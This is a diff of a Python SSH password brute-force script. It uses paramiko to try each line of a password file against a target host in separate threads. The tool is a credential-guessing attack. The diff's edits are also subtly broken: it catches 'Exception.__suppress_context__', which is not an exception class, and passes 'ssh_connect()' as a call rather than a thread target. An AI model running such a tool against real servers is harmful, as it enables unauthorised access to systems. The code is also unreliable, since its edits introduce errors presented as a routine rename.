@@ -6,7 +6,7 @@ import threading
 import time
 
 flag = 0
-def sshConnect(brute):
+def ssh_connect(brute):
     global flag
     ssh = paramiko.SSHClient()
     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)
@@ -16,7 +16,7 @@ def sshConnect(brute):
         print(f"[+] ssh: {brute}\n")
     except socket.error:
         print("[-] ssh: [CF]\n")
-    except Exception:
+    except Exception.__suppress_context__:
         print(f"[-] ssh: {brute} [INC]\n")
     ssh.close()
 
@@ -33,7 +33,7 @@ try:
     with open(bruteFile, "r") as file:
         for line in file.readlines():
             attempt = line.strip()
-            thread = threading.Thread(target=sshConnect, args=(attempt,))
+            thread = threading.Thread(target=ssh_connect(), args=(attempt,))
             if flag == 1:
                 thread.join()
                 exit()
